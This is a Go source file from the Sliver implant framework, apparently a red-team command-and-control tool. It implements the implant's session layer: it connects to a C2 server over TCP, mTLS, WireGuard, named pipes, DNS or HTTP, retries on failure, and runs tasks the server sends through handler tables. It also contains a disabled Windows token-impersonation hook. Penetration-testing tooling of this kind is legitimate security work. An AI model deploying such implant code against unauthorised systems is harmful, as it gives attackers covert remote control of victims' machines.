package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	// {{if eq .Config.GOOS "windows"}}
	"github.com/bishopfox/sliver/implant/sliver/priv"
	// "github.com/bishopfox/sliver/implant/sliver/syscalls"
	// {{end}}

	// {{if .Config.DNSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
	// {{end}}

	// {{if .Config.HTTPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.CommEnabled}}
	"github.com/bishopfox/sliver/implant/sliver/comm"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	readBufSize = 16 * 1024 // 16kb
)

// Session - A Session is the first, most simple C2 type embedding the base Transport object.
// The role of this type is primarily to transform a connection (physical,logical or even none)
// into a session (as its name implies). This is why some C2 protocols like HTTP or DNS do not
// use the Transport.Conn, because these protocols are themselves session-based, regardless of
// them being used in a offensive security context.
// The session implements the missing methods to satisfy the Channel interface.
type Session struct {
	*transports.Driver // Base
	*sync.RWMutex      // Concurrency management

	// {{if .Config.CommEnabled}}
	// Comm - Each transport over which a Session Connection (above) is working also
	// has a Comm system object, that is referenced here so that when the transport
	// is cut/switched/close, we can close the Comm subsystem and its connections.
	// This will not be started/used when the C2 type is Beacon.
	Comm *comm.Comm
	// {{end}}
}

// NewSession - Instantiate a new Session type, for interactive use of the implant.
func NewSession(t *transports.Driver) (s *Session) {
	s = &Session{
		Driver:  t,
		RWMutex: &sync.RWMutex{},
	}
	return
}

// Start - Start an implant Session, ready to register to the server.
func (s *Session) Start() (err error) {
	// {{if .Config.Debug}}
	log.Printf("Running in Session mode (Transport ID: %s)", s.ID)
	// {{end}}

	// Start the driver first, so that any transport-level
	// protocol connections are started if one is needed.
	// Also reinitialize some state such as attempts/failures,
	// and register some more specialized parallel connections/listeners
	// for Channels like WireGuard: they also use Connection.Cleanup
	s.Conn, err = s.Driver.Connect()
	if err != nil {
		return fmt.Errorf("Driver failed to connect: %s", err)
	}

	// We're now ready to start the Session per-se, which can be ranging from
	// simply wrapping an underlying net.Conn with a TLV ReadWriter on top, or
	// implement a complete session in the original technical meaning, when the
	// C2 Channel is based on HTTP or DNS.
	err = s.StartSession()

	return
}

// StartSession - Either setup a TLV ReadWriter around a provided connection,
// or after having instantiated a complete C2 Channel session implementation.
func (s *Session) StartSession() (err error) {

	// Maybe move this out of here
	for {
		// Return an error if we have exhausted our allowed maximum errors.
		if _, failures := s.Statistics(); failures == int(s.MaxConnectionErrors) {
			return ErrMaxAttempts
		}

		switch s.C2 {

		// Some protocols can count on a physical connection already being here.
		// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled .Config.TCPc2Enabled .Config.NamePipec2Enabled}}
		case sliverpb.C2_TCP, sliverpb.C2_MTLS, sliverpb.C2_WG, sliverpb.C2_NamedPipe:
			if s.Conn == nil {
				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
			}
			err = transports.NewSession(s.Conn, s.Connection)
			// {{end}}

		// {{if .Config.DNSc2Enabled}}
		case sliverpb.C2_DNS:
			err = dnsclient.NewSessionDNS(s.URI, s.Profile(), s.Connection)
			// {{end}}

		// {{if .Config.HTTPc2Enabled}}
		case sliverpb.C2_HTTP:
			err = httpclient.NewSessionHTTP(s.URI, s.Profile(), s.Connection)

		case sliverpb.C2_HTTPS:
			err = httpclient.NewSessionHTTPS(s.URI, s.Profile(), s.Connection)
			// {{end}}

		default:
			// At this level of the Channel stack, we must never get out from here.
			return fmt.Errorf("Invalid C2 address sheme: %s", s.URI.Scheme)
		}

		// Wait and retry if any error was thrown
		// when starting/setting up the session layer
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[%s] Connection failed: %s", s.C2.String(), err)
			// {{end}}
			s.WaitOnFailure()
			continue
		}

		// Else return, there are no errors, we have thus a session
		return
	}

	return
}

// Serve - Block and serve the session handlers. The error channel
// is passed by the caller so that he can monitor for error-caused
// closures of this transport, for automatic fallback purposes.
func (s *Session) Serve(errs chan error) {

	connection := s.Connection

	// Reconnect active pivots
	// pivots.ReconnectActivePivots(connection)

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	sysPivotHandlers := handlers.GetSystemPivotHandlers() // TODO: remove this if needed
	specialHandlers := handlers.GetSpecialHandlers()

	for envelope := range connection.RequestRecv() {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, Transports)

		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if eq .Config.GOOS "windows" }}
			if priv.CurrentToken != 0 {
				// err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
				// if err != nil {
				//         // {{if .Config.Debug}}
				//         log.Printf("Error: %v\n", err)
				//         // {{end}}
				// }
			}
			// {{end}}

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.RequestSend(&sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				})
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := commHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] commHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := transportHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] commHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.RequestSend(&sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				})
			})
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			connection.RequestSend(&sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			})
		}
	}
}

// Send - Send a message to the server without any prior request.
// The underlying ReadWriter ensures no cleanup/shutdown is performed
// before being able to try to write the data to the connection/channel.
func (s *Session) Send(req *sliverpb.Envelope) {
	s.Connection.RequestSend(req)
}

// Close - Close the session and all its underlying components.
func (s *Session) Close() (err error) {
	// {{if .Config.Debug}}
	log.Printf("Closing Session %s (CC: %s)", s.ID, s.URI.String())
	// {{end}}

	// {{if .Config.CommEnabled}}
	if !s.CommDisabled && s.Comm != nil {
		err = s.Comm.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Comm Switch error: " + err.Error())
			// {{end}}
		}
	}
	// {{end}}

	err = s.Connection.Close()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error closing Session connection: %s", err)
		// {{end}}
	}

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", s.URI.String())
	// {{end}}
	return
}
